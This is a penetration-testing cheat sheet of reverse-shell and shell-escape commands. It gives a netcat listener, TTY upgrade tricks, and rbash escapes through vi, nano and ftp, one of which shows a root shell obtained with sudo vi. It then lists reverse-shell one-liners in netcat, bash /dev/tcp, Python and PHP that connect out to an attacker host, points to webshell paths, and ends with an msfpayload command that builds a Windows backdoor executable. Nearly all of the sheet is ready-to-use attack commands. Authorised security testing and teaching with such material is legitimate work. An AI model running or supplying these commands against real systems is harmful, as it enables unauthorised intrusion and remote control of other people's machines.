## Listening for a reverse shell with netcat

```nc -lnvp 4444```

##Get interactive shell. TTY shell
###Python    
`python -c 'import pty; pty.spawn("/bin/sh")'`   
`python -c 'import pty; pty.spawn("/bin/bash")'`

###Bash    
`echo os.system('/bin/bash')`

Check if it is interactive    
`[[ $- == *i* ]] && echo 'Interactive' || echo 'Not interactive'`

###Without TTY
http://pentestmonkey.net/blog/post-exploitation-without-a-tty    

## Escape a restricted shell (rbash)
https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells    

vi
```
sudo vi
:!/bin/bash
bash-3.1# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
```

nano    
Use option `-s` to change spell checker program to `/bin/sh`    
`nano -s /bin/sh`    
Once inside type `/bin/bash` and hit `Ctrl-T`, this will escape rbash. You could also tpe `python`

ftp   
`ftp> !/bin/bash`

# Reverse shells
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
## Netcat    
`nc -e /bin/sh <ip> 1234`    
`nc <ip> 4444 -e '/bin/sh'`

http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498    
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 1234 >/tmp/f`

```
mknod /var/www/backpipe p
/bin/bash 0 < /var/www/backpipe | nc <ip> 4444 1 > /var/www/backpipe
```
## Bash    
```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

## Python
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

##PHP
`; php -r '$sock=fsockopen("<ip>",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`

# Webshells
http://pentestmonkey.net/category/tools/web-shells    
`/usr/share/webshells/php/php-reverse-shell.php`    
`/usr/share/webshells/php`

# Metasploit one liners
Windows meterpreter    
`msfpayload windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 X > /tmp/backdoor.exe`
